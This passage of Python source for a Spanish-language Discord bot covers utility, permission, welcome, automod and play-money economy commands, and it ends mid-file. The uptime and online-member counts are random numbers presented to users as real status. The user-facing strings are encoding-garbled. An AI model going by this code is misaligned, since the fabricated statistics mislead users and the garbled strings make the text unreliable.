  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Simular tiempo de actividad
  days = random.randint(0, 30)
  hours = random.randint(0, 23)
  minutes = random.randint(0, 59)

  embed = discord.Embed(
      title="‚è±Ô∏è Tiempo de Actividad",
      description=f"**{days}** d√≠as, **{hours}** horas, **{minutes}** minutos",
      color=discord.Color.green())

  embed.add_field(name="üìä Estado", value="üü¢ En l√≠nea", inline=True)
  embed.add_field(name="üåê Servidores", value=f"{len(bot.guilds)}", inline=True)
  embed.add_field(name="üë• Usuarios", value=f"~{len(bot.users)}", inline=True)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='choose', description='Elegir entre opciones')
@discord.app_commands.describe(options="Opciones separadas por comas")
async def choose_command(interaction: discord.Interaction, options: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  choices = [choice.strip() for choice in options.split(',') if choice.strip()]

  if len(choices) < 2:
      await interaction.response.send_message(
          "‚ùå Necesitas al menos 2 opciones separadas por comas.", ephemeral=True)
      return

  chosen = random.choice(choices)

  embed = discord.Embed(
      title="üéØ Elecci√≥n Aleatoria",
      description=f"**He elegido:** {chosen}",
      color=discord.Color.gold())

  embed.add_field(name="üìù Opciones",
               value="\n".join([f"‚Ä¢ {choice}" for choice in choices]),
               inline=False)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='ascii', description='Convertir texto a arte ASCII')
@discord.app_commands.describe(text="Texto a convertir (m√°ximo 10 caracteres)")
async def ascii_command(interaction: discord.Interaction, text: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if len(text) > 10:
      await interaction.response.send_message(
          "‚ùå M√°ximo 10 caracteres.", ephemeral=True)
      return

  # ASCII art simple simulado
  ascii_art = f"""
```
‚ñà‚ñà‚ïó  {text.upper()}  ‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ïó
‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù
```"""

  embed = discord.Embed(
      title="üé® Arte ASCII",
      description=ascii_art,
      color=discord.Color.blue())
  embed.set_footer(text="‚ö†Ô∏è Arte ASCII simulado")

  await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE PERMISOS PERSONALIZADO Y COMANDOS DE MODERACI√ìN
# ================================

# Sistema de permisos personalizado
custom_permissions_file = 'custom_permissions.json'
if os.path.exists(custom_permissions_file):
  with open(custom_permissions_file, 'r') as f:
      custom_permissions = json.load(f)
else:
  custom_permissions = {}

def save_custom_permissions():
  with open(custom_permissions_file, 'w') as f:
      json.dump(custom_permissions, f)

def get_user_permissions(user_id, guild_id):
  """Obtener permisos personalizados de un usuario"""
  user_id = str(user_id)
  guild_id = str(guild_id)

  if guild_id not in custom_permissions:
      custom_permissions[guild_id] = {}

  guild_perms = custom_permissions[guild_id]
  return guild_perms.get(user_id, {"can_execute_commands": False})

def set_user_permissions(user_id, guild_id, permissions):
  """Establecer permisos personalizados para un usuario"""
  user_id = str(user_id)
  guild_id = str(guild_id)

  if guild_id not in custom_permissions:
      custom_permissions[guild_id] = {}

  custom_permissions[guild_id][user_id] = permissions
  save_custom_permissions()

def get_role_permissions(role_id, guild_id):
  """Obtener permisos personalizados de un rol"""
  role_id = str(role_id)
  guild_id = str(guild_id)

  if guild_id not in custom_permissions:
      custom_permissions[guild_id] = {}

  guild_perms = custom_permissions[guild_id]
  role_key = f"role_{role_id}"
  return guild_perms.get(role_key, {"can_execute_commands": False})

def set_role_permissions(role_id, guild_id, permissions):
  """Establecer permisos personalizados para un rol"""
  role_id = str(role_id)
  guild_id = str(guild_id)

  if guild_id not in custom_permissions:
      custom_permissions[guild_id] = {}

  role_key = f"role_{role_id}"
  custom_permissions[guild_id][role_key] = permissions
  save_custom_permissions()

def user_has_permission(user, guild, permission_type):
  """Verificar si un usuario tiene un permiso espec√≠fico"""
  if not guild:
      return False

  # El owner del servidor siempre tiene todos los permisos
  if user.id == guild.owner_id:
      return True

  # Verificar permisos de usuario directo
  user_perms = get_user_permissions(user.id, guild.id)
  if user_perms.get(permission_type, False):
      return True

  # Verificar permisos de roles
  for role in user.roles:
      role_perms = get_role_permissions(role.id, guild.id)
      if role_perms.get(permission_type, False):
          return True

  return False

@bot.tree.command(name='say', description='Hacer que el bot env√≠e un mensaje')
@discord.app_commands.describe(
  message="Mensaje que el bot enviar√°",
  channel="Canal donde enviar el mensaje (opcional)"
)
async def say_command(interaction: discord.Interaction, message: str, channel: discord.TextChannel = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Solo el owner del servidor o usuarios con permisos personalizados
  if not (interaction.user.id == interaction.guild.owner_id or
          user_has_permission(interaction.user, interaction.guild, "can_execute_commands")):
      await interaction.response.send_message(
          "‚ùå Solo el propietario del servidor o usuarios con permisos especiales pueden usar este comando.",
          ephemeral=True)
      return

  target_channel = channel or interaction.channel

  # Verificar permisos del bot en el canal objetivo
  if not target_channel.permissions_for(interaction.guild.me).send_messages:
      await interaction.response.send_message(
          f"‚ùå No tengo permisos para enviar mensajes en {target_channel.mention}",
          ephemeral=True)
      return

  try:
      # Enviar el mensaje
      await target_channel.send(message)

      # Confirmar al usuario
      if channel and channel != interaction.channel:
          await interaction.response.send_message(
              f"‚úÖ Mensaje enviado en {target_channel.mention}",
              ephemeral=True)
      else:
          await interaction.response.send_message(
              "‚úÖ Mensaje enviado",
              ephemeral=True)

      # Log del comando
      print(f"Comando /say usado por {interaction.user.name} en {interaction.guild.name}")

  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå Error al enviar mensaje: {str(e)}",
          ephemeral=True)

@bot.tree.command(name='giveperms', description='Otorgar permisos especiales a usuarios o roles')
@discord.app_commands.describe(
  target="Usuario o rol al que otorgar permisos",
  action="Tipo de acci√≥n (can_execute_commands)",
  value="true o false"
)
async def giveperms_command(interaction: discord.Interaction,
                         target: str,
                         action: str,
                         value: bool):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Solo el owner del servidor puede usar este comando
  if interaction.user.id != interaction.guild.owner_id:
      await interaction.response.send_message(
          "‚ùå Solo el propietario del servidor puede usar este comando.",
          ephemeral=True)
      return

  # Validar acci√≥n
  valid_actions = ["can_execute_commands"]
  if action not in valid_actions:
      await interaction.response.send_message(
          f"‚ùå Acci√≥n inv√°lida. Acciones disponibles: {', '.join(valid_actions)}",
          ephemeral=True)
      return

# Procesar el target (usuario o rol)
  target_user = None
  target_role = None

  # Intentar convertir a menci√≥n de usuario
  if target.startswith('<@') and target.endswith('>'):
      user_id = target.strip('<@!>')
      try:
          target_user = interaction.guild.get_member(int(user_id))
      except:
          pass

  # Intentar convertir a menci√≥n de rol
  elif target.startswith('<@&') and target.endswith('>'):
      role_id = target.strip('<@&>')
      try:
          target_role = interaction.guild.get_role(int(role_id))
      except:
          pass

  # Buscar por nombre si no es menci√≥n
  if not target_user and not target_role:
      # Buscar usuario por nombre
      target_user = discord.utils.get(interaction.guild.members, name=target)
      if not target_user:
          target_user = discord.utils.get(interaction.guild.members, display_name=target)

      # Buscar rol por nombre si no se encontr√≥ usuario
      if not target_user:
          target_role = discord.utils.get(interaction.guild.roles, name=target)

  if not target_user and not target_role:
      await interaction.response.send_message(
          "‚ùå No se encontr√≥ el usuario o rol especificado. Usa menciones (@usuario o @rol) o nombres exactos.",
          ephemeral=True)
      return

  # Aplicar permisos
  try:
      if target_user:
          # Obtener permisos actuales del usuario
          current_perms = get_user_permissions(target_user.id, interaction.guild.id)
          current_perms[action] = value
          set_user_permissions(target_user.id, interaction.guild.id, current_perms)

          embed = discord.Embed(
              title="‚úÖ Permisos Actualizados",
              description=f"Permisos modificados para **{target_user.display_name}**",
              color=discord.Color.green()
          )
          embed.add_field(name="üë§ Usuario", value=target_user.mention, inline=True)
          embed.add_field(name="‚öôÔ∏è Acci√≥n", value=action, inline=True)
          embed.add_field(name="‚úÖ Valor", value="Permitido" if value else "Denegado", inline=True)

      elif target_role:
          # Obtener permisos actuales del rol
          current_perms = get_role_permissions(target_role.id, interaction.guild.id)
          current_perms[action] = value
          set_role_permissions(target_role.id, interaction.guild.id, current_perms)

          embed = discord.Embed(
              title="‚úÖ Permisos Actualizados",
              description=f"Permisos modificados para el rol **{target_role.name}**",
              color=discord.Color.green()
          )
          embed.add_field(name="üè∑Ô∏è Rol", value=target_role.mention, inline=True)
          embed.add_field(name="‚öôÔ∏è Acci√≥n", value=action, inline=True)
          embed.add_field(name="‚úÖ Valor", value="Permitido" if value else "Denegado", inline=True)

      embed.set_footer(text=f"Comando ejecutado por {interaction.user.display_name}")
      await interaction.response.send_message(embed=embed)

      # Log del comando
      target_name = target_user.display_name if target_user else target_role.name
      target_type = "usuario" if target_user else "rol"
      print(f"Permisos modificados por {interaction.user.name}: {target_name} ({target_type}) - {action}: {value}")

  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå Error al modificar permisos: {str(e)}",
          ephemeral=True)

@bot.tree.command(name='viewperms', description='Ver permisos especiales de usuarios y roles')
@discord.app_commands.describe(target="Usuario o rol del que ver permisos (opcional)")
async def viewperms_command(interaction: discord.Interaction, target: str = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Solo el owner del servidor puede ver todos los permisos
  if interaction.user.id != interaction.guild.owner_id:
      await interaction.response.send_message(
          "‚ùå Solo el propietario del servidor puede ver los permisos.",
          ephemeral=True)
      return

  guild_id = str(interaction.guild.id)

  if guild_id not in custom_permissions:
      await interaction.response.send_message(
          "‚ùå No hay permisos personalizados configurados en este servidor.",
          ephemeral=True)
      return

  guild_perms = custom_permissions[guild_id]

  if target:
      # Mostrar permisos de un target espec√≠fico
      target_user = None
      target_role = None

      # Buscar usuario o rol
      if target.startswith('<@') and target.endswith('>'):
          user_id = target.strip('<@!>')
          try:
              target_user = interaction.guild.get_member(int(user_id))
          except:
              pass
      elif target.startswith('<@&') and target.endswith('>'):
          role_id = target.strip('<@&>')
          try:
              target_role = interaction.guild.get_role(int(role_id))
          except:
              pass
      else:
          target_user = discord.utils.get(interaction.guild.members, name=target)
          if not target_user:
              target_user = discord.utils.get(interaction.guild.members, display_name=target)

      # Buscar rol por nombre si no se encontr√≥ usuario
      if not target_user:
          target_role = discord.utils.get(interaction.guild.roles, name=target)

      if not target_user and not target_role:
          await interaction.response.send_message(
              "‚ùå No se encontr√≥ el usuario o rol especificado. Usa menciones (@usuario o @rol) o nombres exactos.",
              ephemeral=True)
          return

      if target_user:
          perms = get_user_permissions(target_user.id, interaction.guild.id)
          embed = discord.Embed(
              title=f"üîç Permisos de {target_user.display_name}",
              color=discord.Color.blue()
          )
          embed.set_thumbnail(url=target_user.display_avatar.url)
      else:
          perms = get_role_permissions(target_role.id, interaction.guild.id)
          embed = discord.Embed(
              title=f"üîç Permisos del rol {target_role.name}",
              color=target_role.color if target_role.color != discord.Color.default() else discord.Color.blue()
          )

      perms_text = ""
      for perm, value in perms.items():
          status = "‚úÖ Permitido" if value else "‚ùå Denegado"
          perms_text += f"**{perm}:** {status}\n"

      if not perms_text:
          perms_text = "Sin permisos especiales configurados"

      embed.add_field(name="‚öôÔ∏è Permisos", value=perms_text, inline=False)

  else:
      # Mostrar todos los permisos del servidor
      embed = discord.Embed(
          title=f"üîç Permisos Especiales - {interaction.guild.name}",
          color=discord.Color.blue()
      )

      users_with_perms = []
      roles_with_perms = []

      for key, perms in guild_perms.items():
          if key.startswith("role_"):
              role_id = key.replace("role_", "")
              role = interaction.guild.get_role(int(role_id))
              if role:
                  roles_with_perms.append((role.name, perms))
          else:
              user = interaction.guild.get_member(int(key))
              if user:
                  users_with_perms.append((user.display_name, perms))

      if users_with_perms:
          users_text = ""
          for name, perms in users_with_perms:
              active_perms = [perm for perm, value in perms.items() if value]
              if active_perms:
                  users_text += f"**{name}:** {', '.join(active_perms)}\n"

          if users_text:
              embed.add_field(name="üë• Usuarios", value=users_text, inline=False)

      if roles_with_perms:
          roles_text = ""
          for name, perms in roles_with_perms:
              active_perms = [perm for perm, value in perms.items() if value]
              if active_perms:
                  roles_text += f"**{name}:** {', '.join(active_perms)}\n"

          if roles_text:
              embed.add_field(name="üè∑Ô∏è Roles", value=roles_text, inline=False)

      if not users_with_perms and not roles_with_perms:
          embed.description = "No hay permisos especiales configurados."

  await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE INFORMACI√ìN Y ESTAD√çSTICAS
# ================================

@bot.tree.command(name='stats', description='Estad√≠sticas del servidor')
async def stats_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  guild = interaction.guild
  if not guild:
      await interaction.response.send_message(
          "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
      return

  # Contar tipos de canales
  text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
  voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
  categories = len([c for c in guild.channels if isinstance(c, discord.CategoryChannel)])

  # Contar miembros online (simulado)
  online_members = random.randint(1, min(50, guild.member_count or 10))

  embed = discord.Embed(
      title=f"üìä Estad√≠sticas de {guild.name}",
      color=discord.Color.blue())

  embed.add_field(name="üë• Miembros", value=guild.member_count or "No disponible", inline=True)
  embed.add_field(name="üü¢ En l√≠nea", value=online_members, inline=True)
  embed.add_field(name="üè∑Ô∏è Roles", value=len(guild.roles), inline=True)

  embed.add_field(name="üìù Canales de texto", value=text_channels, inline=True)
  embed.add_field(name="üîä Canales de voz", value=voice_channels, inline=True)
  embed.add_field(name="üìÅ Categor√≠as", value=categories, inline=True)

  embed.add_field(name="üòÑ Emojis", value=len(guild.emojis), inline=True)
  embed.add_field(name="üéâ Boosts", value=guild.premium_subscription_count or 0, inline=True)
  embed.add_field(name="‚≠ê Nivel boost", value=f"Nivel {guild.premium_tier}", inline=True)

  if guild.icon:
      embed.set_thumbnail(url=guild.icon.url)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='roles', description='Lista todos los roles del servidor')
async def roles_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  guild = interaction.guild
  if not guild:
      await interaction.response.send_message(
          "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
      return

  roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)

  embed = discord.Embed(
      title=f"üè∑Ô∏è Roles en {guild.name}",
      description=f"Total: **{len(roles)}** roles",
      color=discord.Color.blue())

  role_list = ""
  for i, role in enumerate(roles[:20]):  # Mostrar m√°ximo 20
      if role.name != "@everyone":
          member_count = len(role.members)
          role_list += f"**{role.name}** - {member_count} miembro{'s' if member_count != 1 else ''}\n"

  if role_list:
      embed.add_field(name="üìã Lista de Roles", value=role_list, inline=False)

  if len(roles) > 20:
      embed.set_footer(text=f"Mostrando 20 de {len(roles)} roles")

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='channels', description='Lista todos los canales del servidor')
async def channels_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  guild = interaction.guild
  if not guild:
      await interaction.response.send_message(
          "‚ùå Este comando solo funciona en servidores.", ephemeral=True)
      return

  text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
  voice_channels = [c for c in guild.channels if isinstance(c, discord.VoiceChannel)]

  embed = discord.Embed(
      title=f"üìã Canales en {guild.name}",
      color=discord.Color.blue())

  if text_channels:
      text_list = "\n".join([f"üí¨ {c.name}" for c in text_channels[:15]])
      embed.add_field(name="üí¨ Canales de Texto", value=text_list, inline=False)

  if voice_channels:
      voice_list = "\n".join([f"üé§ {c.name}" for c in voice_channels[:15]])
      embed.add_field(name="üé§ Canales de Voz", value=voice_list, inline=False)

  total_channels = len(guild.channels)
  if total_channels > 30:
      embed.set_footer(text=f"Mostrando algunos de {total_channels} canales totales")

  await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE BIENVENIDA
# ================================

# Configuraci√≥n de bienvenidas
welcome_settings_file = 'welcome_settings.json'
if os.path.exists(welcome_settings_file):
  with open(welcome_settings_file, 'r') as f:
      welcome_settings = json.load(f)
else:
  welcome_settings = {}

def save_welcome_settings():
  with open(welcome_settings_file, 'w') as f:
      json.dump(welcome_settings, f, indent=4)

@bot.event
async def on_member_join(member):
  guild = member.guild
  guild_id = str(guild.id)

  # Sistema de bienvenidas
  if guild_id in welcome_settings and welcome_settings[guild_id]['enabled']:
      settings = welcome_settings[guild_id]
      channel_id = settings['channel_id']
      message_template = settings['message']

      try:
          channel = guild.get_channel(channel_id)
          if channel:
              # Formatear mensaje de bienvenida
              message = message_template.replace('{user}', member.mention)
              message = message.replace('{username}', member.display_name)
              message = message.replace('{server}', guild.name)

              embed = discord.Embed(
                  title="üëã ¬°Bienvenido!",
                  description=message,
                  color=discord.Color.green()
              )
              embed.set_thumbnail(url=member.display_avatar.url)
              embed.set_footer(text=f"ID del usuario: {member.id}")

              await channel.send(embed=embed)
      except Exception as e:
          print(f"Error al enviar mensaje de bienvenida en {guild.name}: {e}")


@bot.event
async def on_message(message):
  if message.author.bot:
      return

  guild = message.guild
  guild_id = guild.id if guild else None

  # Sistema de automod
  if guild_id and automod_enabled.get(guild_id, False):
      settings = automod_settings.get(guild_id, {})
      spam_limit = settings.get('spam_limit', 5)
      warn_threshold = settings.get('warn_threshold', 3)

      # 1. Detecci√≥n de Spam de Mensajes
      now = datetime.datetime.utcnow().timestamp()
      user_id = message.author.id
      guild_user_id = f"{guild_id}-{user_id}"

      if guild_user_id not in user_message_timestamps:
          user_message_timestamps[guild_user_id] = []

      # Limpiar timestamps antiguos (m√°s de 1 minuto)
      user_message_timestamps[guild_user_id] = [
          ts for ts in user_message_timestamps[guild_user_id]
          if now - ts < 60
      ]

      # A√±adir timestamp actual
      user_message_timestamps[guild_user_id].append(now)

      if len(user_message_timestamps[guild_user_id]) > spam_limit:
          try:
              await message.delete()
              # Aplicar advertencia y posible castigo
              await apply_automod_action(message, guild_id, user_id, "spam")
          except:
              pass # Ignorar errores de permisos o mensaje ya eliminado

      # 2. Detecci√≥n de Palabras Prohibidas
      content_lower = message.content.lower()
      if any(word in content_lower for word in banned_words):
          try:
              await message.delete()
              await apply_automod_action(message, guild_id, user_id, "palabra_prohibida")
          except:
              pass

      # 3. Detecci√≥n de Links Maliciosos (simplificado)
      if "http://" in content_lower or "https://" in content_lower:
          # Aqu√≠ se podr√≠a implementar una verificaci√≥n m√°s robusta de links
          # Por ahora, solo como ejemplo de detecci√≥n
          if any(link in content_lower for link in ["discord.gg/", "bit.ly/", "tinyurl.com/"]):
              await message.delete()
              await apply_automod_action(message, guild_id, user_id, "link_malicioso")

      # 4. Detecci√≥n de Menciones Masivas
      if len(message.mentions) > 10: # M√°s de 10 menciones
          await message.delete()
          await apply_automod_action(message, guild_id, user_id, "mencion_masiva")

  # Sistema de niveles (XP por mensaje)
  if guild_id:
      await process_level_system(message)

  # CR√çTICO: Procesar comandos de econom√≠a y otros
  await bot.process_commands(message)

async def apply_automod_action(message, guild_id, user_id, reason):
  """Aplica acciones de automod (advertencia, castigo)"""
  if user_id not in warning_counts:
      warning_counts[user_id] = {}

  warning_counts[user_id][reason] = warning_counts[user_id].get(reason, 0) + 1
  total_warnings = sum(warning_counts[user_id].values())
  threshold = automod_settings[guild_id]['warn_threshold']

  embed = discord.Embed(
      title="üö´ Acci√≥n de Moderaci√≥n",
      description=f"{message.author.mention} ha sido advertido por {reason}.",
      color=discord.Color.red())
  embed.add_field(name="‚ö†Ô∏è Advertencias",
                  value=f"{total_warnings}/{threshold}",
                  inline=True)

  if total_warnings >= threshold:
      try:
          # Castigo: Silencio por 2 d√≠as
          member = message.guild.get_member(user_id)
          if member:
              await member.timeout(datetime.timedelta(days=2),
                                   reason="Super√≥ el l√≠mite de advertencias de automod")
              embed.add_field(name="üîá Castigo",
                              value="Silenciado por 2 d√≠as",
                              inline=True)
              # Resetear advertencias despu√©s del castigo
              warning_counts[user_id] = {}
      except discord.Forbidden:
          embed.add_field(name="üîá Castigo", value="No se pudo silenciar (permisos)", inline=True)
      except Exception as e:
          embed.add_field(name="üîá Castigo", value=f"Error al silenciar: {e}", inline=True)

  await message.channel.send(embed=embed, delete_after=10)


# ================================
# COMANDOS DE ECONOM√çA CON PREFIJO .
# ================================

# Sistema de loter√≠a
lottery_settings_file = 'lottery_settings.json'
if os.path.exists(lottery_settings_file):
  with open(lottery_settings_file, 'r') as f:
      lottery_settings = json.load(f)
else:
  lottery_settings = {}

def save_lottery_settings():
  with open(lottery_settings_file, 'w') as f:
      json.dump(lottery_settings, f)

@bot.command(name='balance', aliases=['money', 'bal'])
async def balance_command(ctx):
  """Ver tu balance de dinero"""
  user_data = get_balance(ctx.author.id)
  total = user_data['wallet'] + user_data['bank']

  embed = discord.Embed(title="üí∞ Tu Balance", color=discord.Color.green())
  embed.add_field(name="üëõ Billetera", value=f"${user_data['wallet']:,}", inline=True)
  embed.add_field(name="üè¶ Banco", value=f"${user_data['bank']:,}", inline=True)
  embed.add_field(name="üíé Total", value=f"${total:,}", inline=True)
  embed.set_footer(text=f"Balance de {ctx.author.display_name}")

  await ctx.send(embed=embed)

@bot.command(name='work')
async def work_command(ctx):
  """Trabajar para ganar dinero"""
  if not can_use_cooldown(ctx.author.id, 'work', 300):  # 5 minutos
      remaining = get_cooldown_remaining(ctx.author.id, 'work', 300)
      minutes = int(remaining // 60)
      seconds = int(remaining % 60)
      await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de trabajar de nuevo.")
      return

  jobs = [
      ("üë®‚Äçüíª Programador", 500, 1200),
      ("üè™ Cajero", 300, 800),
      ("üöö Conductor", 400, 900),
      ("üë®‚Äçüç≥ Chef", 350, 750),
      ("üìö Bibliotecario", 250, 600),
      ("üßπ Conserje", 200, 500),
      ("üì¶ Repartidor", 300, 700)
  ]

  job_name, min_pay, max_pay = random.choice(jobs)
  earnings = random.randint(min_pay, max_pay)

  update_balance(ctx.author.id, earnings, 0)

  embed = discord.Embed(title="üíº Trabajo Completado", color=discord.Color.green())
  embed.add_field(name="üë∑ Trabajo", value=job_name, inline=True)
  embed.add_field(name="üí∞ Ganaste", value=f"${earnings:,}", inline=True)
  embed.set_footer(text="¬°Buen trabajo! Vuelve en 1 hora.")

  await ctx.send(embed=embed)

@bot.command(name='daily')
async def daily_command(ctx):
  """Recompensa diaria"""
  if not can_use_cooldown(ctx.author.id, 'daily', 86400):  # 24 horas (86400 segundos)
      remaining = get_cooldown_remaining(ctx.author.id, 'daily', 86400)
      hours = int(remaining // 3600)
      minutes = int((remaining % 3600) // 60)
      await ctx.send(f"‚è∞ Ya recogiste tu recompensa diaria. Vuelve en **{hours}h {minutes}m**.")
      return

  daily_amount = random.randint(800, 1500)
  update_balance(ctx.author.id, daily_amount, 0)

  embed = discord.Embed(title="üéÅ Recompensa Diaria", color=discord.Color.gold())
  embed.add_field(name="üí∞ Ganaste", value=f"${daily_amount:,}", inline=True)
  embed.add_field(name="‚è∞ Pr√≥xima", value="En 24 horas", inline=True)
  embed.set_footer(text="¬°Vuelve ma√±ana para m√°s!")

  await ctx.send(embed=embed)

@bot.command(name='pay')
async def pay_command(ctx, member: discord.Member = None, amount: int = None):
  """Enviar dinero a otro usuario"""
  if not member or not amount:
      await ctx.send("‚ùå Uso: `.pay @usuario cantidad`")
      return

  if member.bot:
      await ctx.send("‚ùå No puedes enviar dinero a un bot.")
      return

  if member.id == ctx.author.id:
      await ctx.send("‚ùå No puedes enviarte dinero a ti mismo.")
      return

  if amount <= 0:
      await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
      return

  sender_balance = get_balance(ctx.author.id)
  if sender_balance['wallet'] < amount:
      await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${sender_balance['wallet']:,}")
      return

  # Transferir dinero
  update_balance(ctx.author.id, -amount, 0)
  update_balance(member.id, amount, 0)

  embed = discord.Embed(title="üí∏ Transferencia Exitosa", color=discord.Color.green())
  embed.add_field(name="üë§ Enviaste", value=f"${amount:,} a {member.mention}", inline=False)
  embed.set_footer(text="¬°Transferencia completada!")

  await ctx.send(embed=embed)

@bot.command(name='deposit', aliases=['dep'])
async def deposit_command(ctx, amount=None):
  """Depositar dinero en el banco"""
  if not amount:
      await ctx.send("‚ùå Uso: `.deposit cantidad` o `.deposit all`")
      return

  user_balance = get_balance(ctx.author.id)

  if amount.lower() == 'all':
      amount = user_balance['wallet']
  else:
      try:
          amount = int(amount)
      except ValueError:
          await ctx.send("‚ùå Cantidad inv√°lida.")
          return

  if amount <= 0:
      await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
      return

  if user_balance['wallet'] < amount:
      await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
      return

  update_balance(ctx.author.id, -amount, amount)

  embed = discord.Embed(title="üè¶ Dep√≥sito Exitoso", color=discord.Color.blue())
  embed.add_field(name="üí∞ Depositaste", value=f"${amount:,}", inline=True)
  embed.add_field(name="üè¶ Nuevo balance bancario", value=f"${user_balance['bank'] + amount:,}", inline=True)

  await ctx.send(embed=embed)

@bot.command(name='withdraw')
async def withdraw_command(ctx, amount=None):
  """Retirar dinero del banco"""
  if not amount:
      await ctx.send("‚ùå Uso: `.withdraw cantidad` o `.withdraw all`")
      return

  user_balance = get_balance(ctx.author.id)

  if amount.lower() == 'all':
      amount = user_balance['bank']
  else:
      try:
          amount = int(amount)
      except ValueError:
          await ctx.send("‚ùå Cantidad inv√°lida.")
          return

  if amount <= 0:
      await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
      return

  if user_balance['bank'] < amount:
      await ctx.send(f"‚ùå No tienes suficiente dinero en el banco. Tienes ${user_balance['bank']:,}")
      return

  update_balance(ctx.author.id, amount, -amount)

  embed = discord.Embed(title="üè¶ Retiro Exitoso", color=discord.Color.blue())
  embed.add_field(name="üí∞ Retiraste", value=f"${amount:,}", inline=True)
  embed.add_field(name="üëõ Nuevo balance de billetera", value=f"${user_balance['wallet'] + amount:,}", inline=True)

  await ctx.send(embed=embed)

@bot.command(name='beg', aliases=['b'])
async def beg_command(ctx):
  """Mendigar por dinero"""
  if not can_use_cooldown(ctx.author.id, 'beg', 30):  # 30 segundos
      remaining = get_cooldown_remaining(ctx.author.id, 'beg', 30)
      minutes = int(remaining // 60)
      seconds = int(remaining % 60)
      await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de mendigar de nuevo.")
      return

  success_chance = random.random()

  if success_chance > 0.3:  # 70% de √©xito
      amount = random.randint(50, 200)
      update_balance(ctx.author.id, amount, 0)

      messages = [
          f"Aun as√≠, un amable extra√±o te dio ${amount:,}!",
          f"Una buena samaritana te dio ${amount:,}!",
          f"Alguien se apiad√≥ de ti y te dio ${amount:,}.",
          f"¬°Encontraste ${amount:,} en el suelo!"
      ]

      await ctx.send(random.choice(messages))
  else:
      messages = [
          "Nadie te prest√≥ atenci√≥n esta vez.",
          "Te ignoraron por completo.",
          "Tuviste mala suerte y no recibiste nada."
      ]

      await ctx.send(random.choice(messages))

@bot.command(name='crime', aliases=['cr'])
async def crime_command(ctx):
  """Cometer cr√≠menes por dinero (riesgoso)"""
  if not can_use_cooldown(ctx.author.id, 'crime', 180):  # 3 minutos
      remaining = get_cooldown_remaining(ctx.author.id, 'crime', 180)
      minutes = int(remaining // 60)
      seconds = int(remaining % 60)
      await ctx.send(f"‚è∞ Debes esperar **{minutes}m {seconds}s** antes de cometer otro crimen.")
      return

  crimes = [
      ("üè™ Robar una tienda", 200, 800),
      ("üöó Robar un auto", 500, 1200),
      ("üíª Hackear un banco", 800, 2000),
      ("üíé Robar joyer√≠a", 600, 1500),
      ("üèõÔ∏è Robar un museo", 1000, 2500)
  ]

  crime_name, min_reward, max_reward = random.choice(crimes)
  success_chance = random.random()

  if success_chance > 0.4:  # 60% de √©xito
      reward = random.randint(min_reward, max_reward)
      update_balance(ctx.author.id, reward, 0)

      embed = discord.Embed(title="üé≠ Crimen Exitoso", color=discord.Color.green())
      embed.add_field(name="üî´ Crimen", value=crime_name, inline=True)
      embed.add_field(name="üí∞ Ganaste", value=f"${reward:,}", inline=True)
      embed.set_footer(text="¬°Escapaste sin ser atrapado!")

      await ctx.send(embed=embed)
  else:
      fine = random.randint(100, 500)
      user_balance = get_balance(ctx.author.id)

      if user_balance['wallet'] >= fine:
          update_balance(ctx.author.id, -fine, 0)

      embed = discord.Embed(title="üöî Te Atraparon", color=discord.Color.red())
      embed.add_field(name="üî´ Crimen", value=crime_name, inline=True)
      embed.add_field(name="üí∏ Multa", value=f"${fine:,}", inline=True)
      embed.set_footer(text="¬°La polic√≠a te atrap√≥!")

      await ctx.send(embed=embed)

@bot.command(name='rob', aliases=['r'])
